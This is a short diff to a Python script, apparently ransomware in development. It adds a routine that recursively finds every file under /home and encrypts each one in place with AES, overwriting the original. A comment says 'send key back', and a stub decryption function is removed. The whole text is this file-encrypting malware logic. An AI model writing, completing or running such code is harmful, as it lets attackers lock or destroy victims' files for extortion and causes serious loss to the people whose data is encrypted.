@@ -10,6 +10,8 @@ from Crypto.Util import Counter
 
 from Crypto import Random
 
+import file_finder
+
 #Encryption and decryption functions adapted from: https://stackoverflow.com/questions/20852664/python-pycrypto-encrypt-decrypt-text-files-with-aes
 
 
@@ -39,13 +41,17 @@ def performCrypto(file_name, key, cryptoFunc):
 		fo.seek(0)
 		fo.truncate()
 		fo.write(resultant)
-	
+
+def beginFileModification(key, cryptoFunc):
+
+	#send key back
+	#change directory accordingly
+	startDirectory = ['/home']
+	for currentDirectory in startDirectory:
+		for file in file_finder.findFiles(currentDirectory):
+			performCrypto(file, key, cryptoFunc)
+
 		
-
-
-def decryptFile(file, cipher):
-	print("decrypt")
-
 if __name__ == '__main__':
 	#encrypt file and then decrtypt
 	key = generateEncryptionKey(16)
